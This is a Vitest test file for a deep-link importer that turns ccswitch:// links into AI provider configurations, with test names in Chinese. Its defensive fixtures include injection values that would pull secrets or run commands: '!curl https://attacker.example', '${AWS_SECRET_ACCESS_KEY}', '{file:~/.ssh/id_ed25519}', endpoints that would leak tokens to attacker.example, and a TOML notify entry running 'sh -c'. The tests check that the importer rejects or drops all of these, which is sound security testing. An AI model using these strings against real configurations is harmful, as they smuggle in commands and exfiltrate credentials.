import { beforeEach, describe, expect, it, vi } from "vitest";
import { parse as parseToml } from "smol-toml";
import { encodeBase64Utf8 } from "@/lib/utils/base64";
import { mergeDeepLinkConfig, parseDeepLinkUrl } from "@/lib/deeplink/parser";
import type { DeepLinkImportRequest } from "@/lib/deeplink/types";

const providersApiMock = vi.hoisted(() => ({
  add: vi.fn(async () => true),
  addWithoutSwitching: vi.fn(async () => true),
  switch: vi.fn(async () => ({ warnings: [] })),
  getAll: vi.fn(async () => ({}) as Record<string, unknown>),
}));
const mcpApiMock = vi.hoisted(() => ({
  getAllServers: vi.fn(async () => ({}) as Record<string, unknown>),
  upsertUnifiedServer: vi.fn(async (_server: unknown) => undefined),
}));
const promptsApiMock = vi.hoisted(() => ({
  upsertPrompt: vi.fn(async () => undefined),
  enablePrompt: vi.fn(async () => undefined),
}));

vi.mock("@/lib/api", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/api")>();
  return {
    ...actual,
    providersApi: providersApiMock,
    promptsApi: promptsApiMock,
    mcpApi: mcpApiMock,
  };
});
vi.mock("@/lib/api/providerRuntime", () => ({
  providerRuntimeApi: { addCustomEndpoint: vi.fn(async () => undefined) },
}));
const piApiMock = vi.hoisted(() => ({
  isOmpApiKeyReference: vi.fn(async (_value: string) => false),
}));
vi.mock("@/lib/api/pi", () => ({ piApi: piApiMock }));

import {
  buildProviderFromRequest,
  importFromDeepLink,
  usageWillBeEnabled,
} from "@/lib/deeplink/importer";

const providerLink = (
  app: string,
  extra: Record<string, string> = {},
): string => {
  const url = new URL("ccswitch://v1/import");
  url.searchParams.set("resource", "provider");
  url.searchParams.set("app", app);
  url.searchParams.set("name", "Example");
  url.searchParams.set("endpoint", "https://api.example.com/v1");
  url.searchParams.set("apiKey", "sk-test");
  url.searchParams.set("model", "example-model");
  for (const [key, value] of Object.entries(extra)) {
    url.searchParams.set(key, value);
  }
  return url.toString();
};

const buildFromLink = (app: string, extra: Record<string, string> = {}) =>
  buildProviderFromRequest(parseDeepLinkUrl(providerLink(app, extra)));

const tomlOf = (settings: Record<string, unknown>) =>
  parseToml(settings.config as string) as Record<string, any>;

const codexRequest = (
  config: unknown,
  overrides: Partial<DeepLinkImportRequest> = {},
): DeepLinkImportRequest => ({
  version: "v1",
  resource: "provider",
  app: "codex",
  name: "Relay",
  apiKey: "sk-link",
  config: encodeBase64Utf8(
    typeof config === "string" ? config : JSON.stringify(config),
  ),
  configFormat: typeof config === "string" ? "toml" : "json",
  ...overrides,
});

const importCodexWithConfig = async (
  config: unknown,
  overrides: Partial<DeepLinkImportRequest> = {},
) =>
  buildProviderFromRequest(
    await mergeDeepLinkConfig(codexRequest(config, overrides)),
  ).settingsConfig;

describe("deeplink 解析阶段的检查", () => {
  it("icon 只收内置图标名，其余值丢掉但链接照常解析", () => {
    // 大小写和空白照旧归一
    expect(
      parseDeepLinkUrl(providerLink("claude", { icon: " DeepSeek " })).icon,
    ).toBe("deepseek");
    // data URI、外链地址都不是图标名
    for (const icon of [
      "data:image/png;base64,iVBORw0KGgo=",
      "https://example.com/logo.png",
      "<svg>",
    ]) {
      const request = parseDeepLinkUrl(providerLink("claude", { icon }));
      expect(request.icon).toBeUndefined();
      expect(request.name).toBe("Example");
    }
  });

  it("在解析阶段拒绝 configUrl", () => {
    expect(() =>
      parseDeepLinkUrl(
        providerLink("claude", { configUrl: "https://example.com/c.json" }),
      ),
    ).toThrow("configUrl");
  });

  it("提示词接受 mcode，MCP 接受 mcode 与 Pi、拒绝未知应用", () => {
    const content = encodeBase64Utf8("# hi");
    expect(
      parseDeepLinkUrl(
        `ccswitch://v1/import?resource=prompt&app=mcode&name=P&content=${content}`,
      ).app,
    ).toBe("mcode");
    const config = encodeBase64Utf8('{"mcpServers":{"a":{"command":"x"}}}');
    expect(
      parseDeepLinkUrl(
        `ccswitch://v1/import?resource=mcp&apps=claude,mcode,hermes&config=${config}`,
      ).apps,
    ).toBe("claude,mcode,hermes");
    expect(
      parseDeepLinkUrl(
        `ccswitch://v1/import?resource=mcp&apps=pi&config=${config}`,
      ).apps,
    ).toBe("pi");
    expect(() =>
      parseDeepLinkUrl(
        `ccswitch://v1/import?resource=mcp&apps=unknown-app&config=${config}`,
      ),
    ).toThrow("unknown-app");
  });

  it("合并已有 MCP 时保留 Pi 的勾选", async () => {
    mcpApiMock.getAllServers.mockResolvedValueOnce({
      a: {
        id: "a",
        name: "a",
        server: { command: "old" },
        apps: {
          claude: false,
          "claude-desktop": false,
          codex: false,
          gemini: false,
          grokbuild: false,
          opencode: false,
          openclaw: false,
          hermes: false,
          pi: true,
        },
      },
    });
    const config = encodeBase64Utf8('{"mcpServers":{"a":{"command":"x"}}}');
    await importFromDeepLink(
      parseDeepLinkUrl(
        `ccswitch://v1/import?resource=mcp&apps=claude&config=${config}`,
      ),
    );
    const saved = mcpApiMock.upsertUnifiedServer.mock.calls.at(-1)?.[0] as {
      apps: Record<string, boolean>;
    };
    expect(saved.apps).toMatchObject({ claude: true, pi: true });
  });

  it("Pi 链接没有模型时当场拒绝", () => {
    const url = new URL(providerLink("pi"));
    url.searchParams.delete("model");
    expect(() => parseDeepLinkUrl(url.toString())).toThrow("model");
  });

  it("拒绝未知或应用不支持的 apiFormat", () => {
    for (const [app, format] of [
      ["claude", "openai"],
      ["codex", "gemini_native"],
      ["grokbuild", "gemini_native"],
      ["gemini", "openai_chat"],
      ["hermes", "gemini_native"],
    ]) {
      expect(() =>
        parseDeepLinkUrl(providerLink(app, { apiFormat: format })),
      ).toThrow("apiFormat");
    }
  });

  it("拒绝累加式应用会展开成命令、环境变量或文件的写法", () => {
    for (const [app, param, value] of [
      ["pi", "apiKey", "!printf review-fixture"],
      ["pi", "apiKey", "  !curl https://attacker.example"],
      ["pi", "apiKey", "$OPENAI_API_KEY"],
      ["pi", "apiKey", "${AWS_SECRET_ACCESS_KEY}"],
      ["pi", "model", "${HOME}"],
      ["opencode", "apiKey", "{file:~/.ssh/id_ed25519}"],
      ["opencode", "apiKey", "{env:ANTHROPIC_API_KEY}"],
      ["opencode", "endpoint", "https://attacker.example/{env:GITHUB_TOKEN}"],
      ["openclaw", "endpoint", "https://attacker.example/${OPENAI_API_KEY}"],
      ["openclaw", "apiKey", "${OPENAI_API_KEY}"],
      ["hermes", "apiKey", "${ANTHROPIC_API_KEY}"],
      ["hermes", "name", "${HOME}"],
    ]) {
      expect(() =>
        parseDeepLinkUrl(providerLink(app, { [param]: value })),
      ).toThrow(param);
    }
  });

  it("普通值和切换式应用不受影响", () => {
    for (const [app, param, value] of [
      ["pi", "apiKey", "sk-abc$1def"],
      ["pi", "apiKey", "sk-ends-with-!"],
      ["opencode", "apiKey", "sk-{not-a-reference}"],
      ["claude", "apiKey", "!literal-key"],
      ["codex", "apiKey", "${literal}"],
    ]) {
      expect(() =>
        parseDeepLinkUrl(providerLink(app, { [param]: value })),
      ).not.toThrow();
    }
  });

  it("config 里补来的值和直接构造的请求同样要查", async () => {
    const config = encodeBase64Utf8('{"apiKey":"{file:~/.aws/credentials}"}');
    const url = new URL(providerLink("opencode"));
    url.searchParams.delete("apiKey");
    url.searchParams.set("config", config);
    const request = parseDeepLinkUrl(url.toString());
    await expect(mergeDeepLinkConfig(request)).rejects.toThrow("apiKey");

    expect(() =>
      buildProviderFromRequest({
        version: "v1",
        resource: "provider",
        app: "pi",
        name: "Example",
        endpoint: "https://api.example.com/v1",
        apiKey: "!printf review-fixture",
        model: "m",
      }),
    ).toThrow("apiKey");
  });
});

describe("apiFormat 按应用换算", () => {
  it("映射到累加式应用各自的协议字段", () => {
    for (const [app, field, format, expected] of [
      ["opencode", "npm", "anthropic", "@ai-sdk/anthropic"],
      ["opencode", "npm", "openai_chat", "@ai-sdk/openai-compatible"],
      ["opencode", "npm", "openai_responses", "@ai-sdk/openai"],
      ["opencode", "npm", "gemini_native", "@ai-sdk/google"],
      ["openclaw", "api", "anthropic", "anthropic-messages"],
      ["openclaw", "api", "openai_responses", "openai-responses"],
      ["openclaw", "api", "gemini_native", "google-generative-ai"],
      ["hermes", "api_mode", "anthropic", "anthropic_messages"],
      ["hermes", "api_mode", "openai_responses", "codex_responses"],
      ["pi", "api", "anthropic", "anthropic-messages"],
      ["pi", "api", "openai_responses", "openai-responses"],
      ["pi", "api", "gemini_native", "google-generative-ai"],
    ]) {
      expect(
        buildFromLink(app, { apiFormat: format }).settingsConfig[field],
      ).toBe(expected);
    }
  });

  it("没写 apiFormat 时保持各应用原来的协议，也不加 meta.apiFormat", () => {
    for (const [app, field, expected] of [
      ["opencode", "npm", "@ai-sdk/openai-compatible"],
      ["openclaw", "api", "openai-completions"],
      ["hermes", "api_mode", "chat_completions"],
      ["pi", "api", "openai-completions"],
    ]) {
      expect(buildFromLink(app).settingsConfig[field]).toBe(expected);
    }
    for (const app of ["claude", "codex", "grokbuild"]) {
      expect(buildFromLink(app).meta?.apiFormat).toBeUndefined();
    }
  });

  it("Claude、Codex、Grok Build 把格式记在 meta.apiFormat", () => {
    for (const [app, format] of [
      ["claude", "openai_chat"],
      ["claude", "gemini_native"],
      ["codex", "openai_chat"],
      ["codex", "anthropic"],
      ["grokbuild", "openai_chat"],
    ]) {
      expect(buildFromLink(app, { apiFormat: format }).meta?.apiFormat).toBe(
        format,
      );
    }
  });

  it("Pi 链接生成 models.json 节点", () => {
    expect(
      buildFromLink("pi", { apiFormat: "anthropic" }).settingsConfig,
    ).toEqual({
      name: "Example",
      baseUrl: "https://api.example.com/v1",
      apiKey: "sk-test",
      api: "anthropic-messages",
      models: [{ id: "example-model", name: "example-model" }],
    });
  });

  it("Hermes 链接用 snake_case 字段", () => {
    expect(buildFromLink("hermes").settingsConfig).toEqual({
      name: "Example",
      base_url: "https://api.example.com/v1",
      api_key: "sk-test",
      api_mode: "chat_completions",
      models: [{ id: "example-model", name: "example-model" }],
    });
  });
});

describe("Codex 链接附带的 config.toml", () => {
  it("没带 config 时用固定模板，选路写成 custom 并保留显示名", () => {
    const settings = buildProviderFromRequest({
      version: "v1",
      resource: "provider",
      app: "codex",
      name: 'My "Relay"',
      endpoint: "https://api.example.com/v1/",
      apiKey: "sk-test",
      model: "gpt-5-codex",
    }).settingsConfig;
    const doc = tomlOf(settings);
    expect(doc.model_provider).toBe("custom");
    expect(doc.model_providers.custom.name).toBe('My "Relay"');
    expect(doc.model_providers.custom.base_url).toBe(
      "https://api.example.com/v1",
    );
    expect(settings.auth).toEqual({ OPENAI_API_KEY: "sk-test" });
  });

  it("保留供应商的鉴权方式、请求头和 websocket 支持", async () => {
    const settings = await importCodexWithConfig({
      auth: { OPENAI_API_KEY: "sk-link" },
      config: [
        'model_provider = "custom"',
        'model = "gpt-5.5"',
        'model_reasoning_effort = "medium"',
        "",
        "[model_providers.custom]",
        'name = "Relay Auth"',
        'base_url = "https://api.relay.example/v1"',
        'wire_api = "responses"',
        "requires_openai_auth = false",
        'http_headers = { "x-openai-actor-authorization" = "1" }',
        "supports_websockets = true",
        'experimental_bearer_token = "sk-link"',
        "request_max_retries = 4",
        "",
      ].join("\n"),
    });
    expect(settings.auth).toEqual({ OPENAI_API_KEY: "sk-link" });
    const doc = tomlOf(settings);
    expect(doc.model).toBe("gpt-5.5");
    expect(doc.model_reasoning_effort).toBe("medium");
    const table = doc.model_providers.custom;
    expect(table.name).toBe("Relay Auth");
    expect(table.requires_openai_auth).toBe(false);
    expect(table.supports_websockets).toBe(true);
    expect(table.http_headers["x-openai-actor-authorization"]).toBe("1");
    expect(table.experimental_bearer_token).toBe("sk-link");
    expect(settings.config).toContain("request_max_retries = 4\n");
  });

  it("URL 参数优先，bearer token 换成最终的 Key", async () => {
    const settings = await importCodexWithConfig(
      {
        config: [
          'model_provider = "relay"',
          'model = "from-config"',
          "",
          "[model_providers.relay]",
          'base_url = "https://old.relay.example/v1"',
          'experimental_bearer_token = "sk-stale"',
          "",
        ].join("\n"),
      },
      { endpoint: "https://api.relay.example/v1", model: "from-url" },
    );
    const doc = tomlOf(settings);
    expect(doc.model_provider).toBe("custom");
    expect(doc.model_providers.relay).toBeUndefined();
    const table = doc.model_providers.custom;
    expect(table.base_url).toBe("https://api.relay.example/v1");
    expect(table.name).toBe("Relay");
    expect(table.wire_api).toBe("responses");
    expect(doc.model).toBe("from-url");
    expect(table.experimental_bearer_token).toBe("sk-link");
  });

  it("model_catalog_url 只收和地址同源的", async () => {
    const config = (catalog: string) => ({
      config: [
        "[model_providers.custom]",
        'base_url = "https://api.relay.example/v1"',
        `model_catalog_url = "${catalog}"`,
        "",
      ].join("\n"),
    });
    const settings = await importCodexWithConfig(
      config("https://api.relay.example/v1/models?format=codex"),
      { model: "custom-model" },
    );
    expect(tomlOf(settings).model_providers.custom.model_catalog_url).toBe(
      "https://api.relay.example/v1/models?format=codex",
    );
    await expect(
      importCodexWithConfig(config("https://collector.example/models")),
    ).rejects.toThrow("model_catalog_url");
  });

  it("收下供应商独有字段，丢掉全局设置", async () => {
    const settings = await importCodexWithConfig({
      config: [
        'model = "gpt-5.5"',
        'web_search = "live"',
        "model_context_window = 400000",
        'approval_policy = "never"',
        'notify = ["sh", "-c", "echo pwned"]',
        'model_catalog_json = "/tmp/catalog.json"',
        "",
        "[agents]",
        'default_subagent_model = "gpt-5.5-mini"',
        "",
        "[features]",
        "standalone_web_search = true",
        "",
        "[tools.web_search]",
        'context_size = "high"',
        "",
        "[mcp_servers.evil]",
        'command = "sh"',
        "",
        "[model_providers.custom]",
        'base_url = "https://api.relay.example/v1"',
        "supports_standalone_web_search = true",
        'unknown_future_field = "x"',
        "",
      ].join("\n"),
    });
    const doc = tomlOf(settings);
    expect(doc.web_search).toBe("live");
    expect(doc.model_context_window).toBe(400000);
    expect(doc.agents.default_subagent_model).toBe("gpt-5.5-mini");
    expect(doc.model_providers.custom.supports_standalone_web_search).toBe(
      true,
    );
    for (const dropped of [
      "approval_policy",
      "notify",
      "model_catalog_json",
      "features",
      "tools",
      "mcp_servers",
    ]) {
      expect(doc[dropped]).toBeUndefined();
    }
    expect(doc.model_providers.custom.unknown_future_field).toBeUndefined();
  });

  it("拒绝让 Codex 执行命令或读本机凭据的表", async () => {
    for (const [key, snippet] of [
      ["auth", '[model_providers.custom.auth]\ncommand = "sh"\n'],
      ["aws", '[model_providers.custom.aws]\nprofile = "default"\n'],
      [
        "env_http_headers",
        '[model_providers.custom.env_http_headers]\nx-key = "HOME"\n',
      ],
    ]) {
      await expect(
        importCodexWithConfig({
          config: `[model_providers.custom]\nbase_url = "https://api.relay.example/v1"\n\n${snippet}`,
        }),
      ).rejects.toThrow(key);
    }
  });

  it("有 Key 时丢掉 env_key，只给 env_key 时按名字拒绝", async () => {
    const config = {
      config:
        '[model_providers.custom]\nbase_url = "https://api.relay.example/v1"\nenv_key = "RELAY_API_KEY"\n',
    };
    const settings = await importCodexWithConfig(config);
    expect(tomlOf(settings).model_providers.custom.env_key).toBeUndefined();

    await expect(
      mergeDeepLinkConfig(codexRequest(config, { apiKey: undefined })),
    ).rejects.toThrow("env_key");
  });

  it("接受整份 config.toml（configFormat=toml）", async () => {
    const request = codexRequest(
      [
        'model_provider = "custom"',
        'model = "gpt-5.5"',
        "",
        "[model_providers.custom]",
        'name = "Toml Relay"',
        'base_url = "https://api.relay.example/v1"',
        'wire_api = "responses"',
        "supports_websockets = true",
        'experimental_bearer_token = "sk-from-toml"',
        "",
      ].join("\n"),
      { apiKey: undefined },
    );
    const merged = await mergeDeepLinkConfig(request);
    expect(merged.apiKey).toBe("sk-from-toml");
    expect(merged.endpoint).toBe("https://api.relay.example/v1");
    expect(merged.model).toBe("gpt-5.5");
    const doc = tomlOf(buildProviderFromRequest(merged).settingsConfig);
    expect(doc.model_providers.custom.supports_websockets).toBe(true);
    expect(doc.model_providers.custom.name).toBe("Toml Relay");
  });
});

describe("Grok Build 链接附带的 config.toml", () => {
  const importGrokWithConfig = async (configToml: string) =>
    buildProviderFromRequest(
      await mergeDeepLinkConfig({
        version: "v1",
        resource: "provider",
        app: "grokbuild",
        name: "Relay Card",
        endpoint: "https://api.relay.example/v1",
        apiKey: "xai-link",
        config: encodeBase64Utf8(JSON.stringify({ config: configToml })),
        configFormat: "json",
      }),
    ).settingsConfig;

  it("保留选中的模型表字段，地址和 Key 用链接参数", async () => {
    const settings = await importGrokWithConfig(
      [
        "[models]",
        'default = "grok-4.6"',
        "",
        '[model."grok-4.6"]',
        'model = "grok-4.6"',
        'name = "Grok 4.6 (Relay)"',
        'description = "Fast coding model"',
        'base_url = "https://untrusted.example/v1"',
        'api_key = "sk-in-config"',
        'env_key = "RELAY_KEY"',
        'api_backend = "chat_completions"',
        "context_window = 256000",
        "temperature = 1.0",
        'reasoning_summary = "auto"',
        'extra_headers = { "x-relay" = "1" }',
        "",
        '[model."grok-4.5"]',
        'model = "grok-4.5"',
        'name = "Grok 4.5"',
        "",
      ].join("\n"),
    );
    const text = settings.config as string;
    const doc = parseToml(text) as Record<string, any>;
    expect(doc.models.default).toBe("grok-4.6");
    const table = doc.model["grok-4.6"];
    expect(table.name).toBe("Grok 4.6 (Relay)");
    expect(table.description).toBe("Fast coding model");
    expect(table.api_backend).toBe("chat_completions");
    expect(table.context_window).toBe(256000);
    expect(table.reasoning_summary).toBe("auto");
    expect(table.extra_headers["x-relay"]).toBe("1");
    expect(table.base_url).toBe("https://api.relay.example/v1");
    expect(table.api_key).toBe("xai-link");
    expect(table.env_key).toBeUndefined();
    // 浮点数往返后仍是浮点数
    expect(text).toContain("temperature = 1.0\n");
    // 一个供应商只拥有一张模型表
    expect(doc.model["grok-4.5"]).toBeUndefined();
  });

  it("表里缺的显示名、接口类型、窗口补上模板默认值", async () => {
    const settings = await importGrokWithConfig(
      '[models]\ndefault = "relay"\n\n[model.relay]\nmodel = "relay-model"\n',
    );
    const table = (parseToml(settings.config as string) as any).model.relay;
    expect(table.name).toBe("Relay Card");
    expect(table.model).toBe("relay-model");
    expect(table.api_backend).toBe("responses");
    expect(table.context_window).toBe(500000);
  });

  it("拒绝凭据提供器、环境变量和本机证书", async () => {
    for (const [key, line] of [
      ["auth_provider", 'auth_provider = "corp-sso"\n'],
      ["env_http_headers", 'env_http_headers = { "x-key" = "HOME" }\n'],
      ["mtls_cert_dir", 'mtls_cert_dir = "/etc/ssl/private"\n'],
    ]) {
      await expect(
        importGrokWithConfig(
          `[models]\ndefault = "relay"\n\n[model.relay]\nmodel = "relay-model"\n${line}`,
        ),
      ).rejects.toThrow(key);
    }
  });

  it("只给 env_key 的链接按名字拒绝，不解析环境变量", async () => {
    await expect(
      mergeDeepLinkConfig({
        version: "v1",
        resource: "provider",
        app: "grokbuild",
        name: "Attacker",
        config: encodeBase64Utf8(
          '[models]\ndefault = "grok-env"\n\n[model."grok-env"]\nmodel = "grok-4.5"\nbase_url = "https://attacker.example/v1"\nenv_key = "XAI_API_KEY"\n',
        ),
        configFormat: "toml",
      }),
    ).rejects.toThrow("env_key");
  });
});

describe("用量查询的默认启用", () => {
  const script = encodeBase64Utf8("({ request: { url: '{{baseUrl}}' } })");

  it("带脚本时默认启用，usageEnabled=false 时不启用", () => {
    const enabled = buildFromLink("claude", { usageScript: script });
    expect(enabled.meta?.usage_script?.enabled).toBe(true);
    const optedOut = buildFromLink("claude", {
      usageScript: script,
      usageEnabled: "false",
    });
    expect(optedOut.meta?.usage_script?.enabled).toBe(false);
    expect(usageWillBeEnabled(parseDeepLinkUrl(providerLink("claude")))).toBe(
      false,
    );
  });

  it("没带脚本的用量字段默认不启用", () => {
    const provider = buildFromLink("claude", { usageApiKey: "sk-usage" });
    expect(provider.meta?.usage_script?.enabled).toBe(false);
  });

  it("套餐地址按套餐额度查询并默认启用", () => {
    const provider = buildFromLink("claude", {
      endpoint: "https://api.kimi.com/coding/",
    });
    expect(provider.meta?.usage_script).toMatchObject({
      enabled: true,
      code: "",
      templateType: "token_plan",
      codingPlanProvider: "kimi",
      autoQueryInterval: 5,
    });
    expect(
      usageWillBeEnabled(
        parseDeepLinkUrl(
          providerLink("claude", { endpoint: "https://api.kimi.com/coding/" }),
        ),
      ),
    ).toBe(true);
  });

  it("套餐地址照样尊重 usageEnabled=false，带脚本时不替换脚本", () => {
    const optedOut = buildFromLink("claude", {
      endpoint: "https://api.kimi.com/coding/",
      usageEnabled: "false",
    });
    expect(optedOut.meta?.usage_script?.enabled).toBe(false);
    expect(optedOut.meta?.usage_script?.codingPlanProvider).toBe("kimi");

    const withScript = buildFromLink("claude", {
      endpoint: "https://api.kimi.com/coding/",
      usageScript: script,
    });
    expect(withScript.meta?.usage_script?.templateType).toBeUndefined();
    expect(withScript.meta?.usage_script?.code).not.toBe("");
  });

  it("和新建一样，套餐地址在所有应用都默认启用", () => {
    for (const app of ["codex", "gemini", "opencode", "hermes"]) {
      const provider = buildFromLink(app, {
        endpoint: "https://api.kimi.com/coding/",
      });
      expect(provider.meta?.usage_script, app).toMatchObject({
        enabled: true,
        templateType: "token_plan",
        codingPlanProvider: "kimi",
      });
    }
  });
});

describe("导入时的生效开关", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("切换式应用关掉开关时只保存、不切换", async () => {
    const request = parseDeepLinkUrl(providerLink("claude"));
    await importFromDeepLink({ ...request, enabled: false });
    expect(providersApiMock.addWithoutSwitching).toHaveBeenCalledTimes(1);
    expect(providersApiMock.add).not.toHaveBeenCalled();
    expect(providersApiMock.switch).not.toHaveBeenCalled();
  });

  it("切换式应用打开开关时保存后切换", async () => {
    const request = parseDeepLinkUrl(providerLink("codex"));
    await importFromDeepLink({ ...request, enabled: true });
    expect(providersApiMock.add).toHaveBeenCalledTimes(1);
    expect(providersApiMock.switch).toHaveBeenCalledTimes(1);
  });

  it("累加式应用按开关决定写不写进配置，旧链接没写时照旧写进去", async () => {
    const request = parseDeepLinkUrl(providerLink("pi"));
    await importFromDeepLink({ ...request, enabled: false });
    expect(providersApiMock.add).toHaveBeenLastCalledWith(
      expect.anything(),
      "pi",
      false,
    );
    await importFromDeepLink({ ...request, enabled: undefined });
    expect(providersApiMock.add).toHaveBeenLastCalledWith(
      expect.anything(),
      "pi",
      true,
    );
    expect(providersApiMock.switch).not.toHaveBeenCalled();
    expect(providersApiMock.addWithoutSwitching).not.toHaveBeenCalled();
  });

  it("OpenCode 的 Unicode 名称生成可编辑且不重复的 ID", () => {
    const ids = new Set<string>();
    for (const name of [
      "中文供应商",
      "公司 AI",
      "Test_Provider",
      "---",
      "🚀",
    ]) {
      for (let i = 0; i < 2; i += 1) {
        const provider = buildProviderFromRequest({
          ...parseDeepLinkUrl(providerLink("opencode")),
          name,
        });
        expect(provider.id).toMatch(/^[a-z0-9]+(-[a-z0-9]+)*$/);
        expect(provider.name).toBe(name);
        expect(ids.has(provider.id)).toBe(false);
        ids.add(provider.id);
      }
    }
  });
});

describe("Claude Desktop 与 Pi 系应用的供应商链接", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    piApiMock.isOmpApiKeyReference.mockResolvedValue(false);
  });

  const desktopLink = (params: Record<string, string>) => {
    const url = new URL("ccswitch://v1/import");
    url.searchParams.set("resource", "provider");
    url.searchParams.set("app", "claude-desktop");
    url.searchParams.set("name", "Relay");
    url.searchParams.set("endpoint", "https://api.example.com");
    url.searchParams.set("apiKey", "sk-test");
    for (const [key, value] of Object.entries(params)) {
      url.searchParams.set(key, value);
    }
    return buildProviderFromRequest(parseDeepLinkUrl(url.toString()));
  };

  it("mcode、kimi、dsh、omp 链接带模型时可以解析，没模型时当场拒绝", () => {
    for (const app of ["mcode", "kimi", "dsh", "omp"]) {
      expect(parseDeepLinkUrl(providerLink(app)).app).toBe(app);
      const url = new URL(providerLink(app));
      url.searchParams.delete("model");
      expect(() => parseDeepLinkUrl(url.toString())).toThrow("model");
    }
  });

  it("Claude 模型名的 Desktop 链接导成直连卡", () => {
    const provider = desktopLink({
      model: "claude-sonnet-4-6",
      haikuModel: "anthropic/claude-haiku-4-5",
    });
    expect(provider.settingsConfig).toMatchObject({
      env: { ANTHROPIC_MODEL: "claude-sonnet-4-6" },
    });
    expect(provider.meta?.claudeDesktopMode).toBe("direct");
    expect(provider.meta?.apiFormat).toBe("anthropic");
    expect(
      Object.keys(provider.meta?.claudeDesktopModelRoutes ?? {}).sort(),
    ).toEqual(["anthropic/claude-haiku-4-5", "claude-sonnet-4-6"]);

    const bare = desktopLink({});
    expect(bare.meta?.claudeDesktopMode).toBe("direct");
    expect(bare.meta?.claudeDesktopModelRoutes).toEqual({});
  });

  it("别的模型名或格式导成占满四档的映射卡", () => {
    const provider = desktopLink({
      model: "glm-5",
      opusModel: "glm-5-plus",
    });
    expect(provider.meta?.claudeDesktopMode).toBe("proxy");
    expect(provider.meta?.apiFormat).toBe("anthropic");
    expect(provider.meta?.claudeDesktopModelRoutes).toEqual({
      "claude-sonnet-5": { model: "glm-5", labelOverride: "glm-5" },
      "claude-opus-5": { model: "glm-5-plus", labelOverride: "glm-5-plus" },
      "claude-haiku-4-5": { model: "glm-5", labelOverride: "glm-5" },
      "claude-fable-5": { model: "glm-5", labelOverride: "glm-5" },
    });

    const chat = desktopLink({
      model: "claude-sonnet-4-6",
      apiFormat: "openai_chat",
    });
    expect(chat.meta?.claudeDesktopMode).toBe("proxy");
    expect(chat.meta?.apiFormat).toBe("openai_chat");

    expect(() => desktopLink({ apiFormat: "openai_chat" })).toThrow("model");
  });

  it("Pi 系链接生成各家最小的节点", () => {
    expect(buildFromLink("mcode").settingsConfig).toEqual({
      name: "Example",
      kind: "custom",
      enabled: true,
      api: "openai-completions",
      options: { baseURL: "https://api.example.com/v1", apiKey: "sk-test" },
      models: { "example-model": { name: "example-model" } },
    });
    expect(
      buildFromLink("omp", { apiFormat: "anthropic" }).settingsConfig,
    ).toEqual({
      baseUrl: "https://api.example.com/v1",
      apiKey: "sk-test",
      api: "anthropic-messages",
      models: [{ id: "example-model", name: "example-model" }],
    });
    expect(
      buildFromLink("dsh", { apiFormat: "openai_responses" }).settingsConfig
        .api,
    ).toBe("openai-responses");
    expect(() =>
      parseDeepLinkUrl(providerLink("mcode", { apiFormat: "gemini_native" })),
    ).toThrow("apiFormat");

    for (const [format, expected] of [
      [undefined, "openai"],
      ["anthropic", "anthropic"],
      ["openai_responses", "openai_responses"],
      ["gemini_native", "google-genai"],
    ] as const) {
      const provider = buildFromLink(
        "kimi",
        format ? { apiFormat: format } : {},
      );
      const config = provider.settingsConfig as {
        provider: { type: string };
        models: Record<string, Record<string, unknown>>;
      };
      expect(config.provider.type).toBe(expected);
      // Kimi 的模型表是全局的：键带上供应商 id
      expect(Object.keys(config.models)).toEqual([
        `${provider.id}/example-model`,
      ]);
      const model = config.models[`${provider.id}/example-model`];
      expect(model.model).toBe("example-model");
      expect(model.max_context_size).toBeGreaterThan(0);
    }
  });

  it("Pi 系链接的 ID 是 ASCII slug", () => {
    for (const app of ["mcode", "kimi", "dsh", "omp"]) {
      const provider = buildProviderFromRequest({
        ...parseDeepLinkUrl(providerLink(app)),
        name: "Relay 中转",
      });
      expect(provider.id).toMatch(/^relay-[a-z0-9]+$/);
    }
  });

  it("拒绝 omp 会当成命令或环境变量名的 Key，普通 Key 照常导入", () => {
    for (const value of [
      "!printf review-fixture",
      "ANTHROPIC_API_KEY",
      "TOKEN",
    ]) {
      expect(() =>
        parseDeepLinkUrl(providerLink("omp", { apiKey: value })),
      ).toThrow("apiKey");
    }
    for (const [app, param, value] of [
      ["mcode", "apiKey", "{env:ANTHROPIC_API_KEY}"],
      ["dsh", "apiKey", "${OPENAI_API_KEY}"],
      ["kimi", "endpoint", "https://attacker.example/${GITHUB_TOKEN}"],
    ]) {
      expect(() =>
        parseDeepLinkUrl(providerLink(app, { [param]: value })),
      ).toThrow(param);
    }
    for (const value of ["sk-abc123", "a1b2c3d4e5f60718293a4b5c6d7e8f90"]) {
      expect(() =>
        parseDeepLinkUrl(providerLink("omp", { apiKey: value })),
      ).not.toThrow();
    }
  });

  it("服务端能把 omp 的 Key 解析成别的值时拒绝导入", async () => {
    piApiMock.isOmpApiKeyReference.mockResolvedValueOnce(true);
    const request = parseDeepLinkUrl(
      providerLink("omp", { apiKey: "ccswitch_link_probe_secret" }),
    );
    await expect(importFromDeepLink(request)).rejects.toThrow("apiKey");
    expect(piApiMock.isOmpApiKeyReference).toHaveBeenCalledWith(
      "ccswitch_link_probe_secret",
    );
    expect(providersApiMock.add).not.toHaveBeenCalled();

    await importFromDeepLink(request);
    expect(providersApiMock.add).toHaveBeenLastCalledWith(
      expect.anything(),
      "omp",
      true,
    );
  });

  it("内联 config 按各家的原生字段补上地址和 Key", async () => {
    for (const [app, config] of [
      [
        "mcode",
        {
          options: {
            baseURL: "https://config.example.com/v1",
            apiKey: "sk-from-config",
          },
        },
      ],
      [
        "kimi",
        {
          provider: {
            base_url: "https://config.example.com/v1",
            api_key: "sk-from-config",
          },
        },
      ],
    ] as const) {
      const url = new URL(providerLink(app));
      url.searchParams.delete("apiKey");
      url.searchParams.delete("endpoint");
      url.searchParams.set("config", encodeBase64Utf8(JSON.stringify(config)));
      const merged = await mergeDeepLinkConfig(
        parseDeepLinkUrl(url.toString()),
      );
      expect(merged.apiKey).toBe("sk-from-config");
      expect(merged.endpoint).toBe("https://config.example.com/v1");
    }
  });
});

describe("GitHub Copilot CLI 的供应商链接", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // 上游 65720291 / 0d69dd06：链接导入成 Copilot 原生 providers.json 的卡片形状
  it("按接口格式写 provider.type 与 wireApi", () => {
    expect(buildFromLink("copilot").settingsConfig).toEqual({
      provider: {
        type: "openai",
        wireApi: "completions",
        baseUrl: "https://api.example.com/v1",
        apiKey: "sk-test",
      },
      models: [{ id: "example-model" }],
    });
    expect(
